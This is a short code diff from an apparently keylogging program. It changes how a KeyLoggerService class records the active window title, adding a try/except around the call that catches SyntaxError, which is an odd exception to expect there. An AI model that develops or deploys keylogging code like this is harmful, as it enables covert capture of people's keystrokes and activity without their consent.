@@ -13,11 +13,10 @@ class KeyLoggerService(IKeloggerService):
 
     @property
     def __window_name(self):
-        current_screen = getActiveWindowTitle()
-        
-        if not current_screen:
-            current_screen = "Desktop"
-
+        try:
+            current_screen = getActiveWindowTitle()
+        except SyntaxError:
+            current_screen = "Unknown"
         return current_screen
 
     def on_press(self, key):
